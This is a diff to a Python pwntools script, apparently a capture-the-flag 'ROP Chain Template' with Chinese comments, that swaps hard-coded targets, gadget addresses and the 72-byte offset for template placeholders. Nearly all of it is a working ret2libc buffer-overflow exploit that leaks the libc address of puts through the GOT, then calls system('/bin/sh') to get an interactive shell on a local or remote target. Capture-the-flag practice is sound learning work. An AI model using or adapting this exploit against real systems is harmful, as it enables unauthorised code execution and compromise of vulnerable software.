@@ -3,14 +3,14 @@
 """
 ROP Chain Template - Return Oriented Programming
 Author: CTF Player
-Date: 2025-01-XX
-Target: target_binary
+Date: {{date}}
+Target: {{target}}
 """
 
 from pwn import *
 
 # 设置目标程序
-binary = "./target"
+binary = "./{{binary_name}}"
 elf = ELF(binary)
 libc = ELF("./libc.so.6")  # 如果有libc
 
@@ -22,7 +22,7 @@ context.arch = 'amd64'
 def exploit():
     # 连接方式选择
     if args.REMOTE:
-        p = remote("127.0.0.1", 9999)
+        p = remote("{{remote_host}}", {{remote_port}})
     else:
         p = process(binary)
 
@@ -34,17 +34,17 @@ def exploit():
         ''')
 
     # 查找gadgets
-    pop_rdi = 0x401234  # pop rdi; ret
-    pop_rsi = 0x401235  # pop rsi; ret
-    pop_rdx = 0x401236  # pop rdx; ret
-    
+    pop_rdi = {{pop_rdi_gadget}}  # pop rdi; ret
+    pop_rsi = {{pop_rsi_gadget}}  # pop rsi; ret
+    pop_rdx = {{pop_rdx_gadget}}  # pop rdx; ret
+
     # 构造ROP链
     rop = ROP(elf)
     rop.call('puts', [elf.got['puts']])
     rop.call(elf.symbols['main'])
-    
+
     # 第一次payload - 泄露libc地址
-    payload1 = b"A" * 72
+    payload1 = b"A" * {{offset}}
     payload1 += rop.chain()
 
     p.sendline(payload1)
@@ -61,13 +61,13 @@ def exploit():
     log.info(f"/bin/sh: {hex(bin_sh_addr)}")
 
     # 第二次payload - 获取shell
-    payload2 = b"A" * 72
+    payload2 = b"A" * {{offset}}
     payload2 += p64(pop_rdi)
     payload2 += p64(bin_sh_addr)
     payload2 += p64(system_addr)
-    
+
     p.sendline(payload2)
-    
+
     # 获取shell
     p.interactive()
 
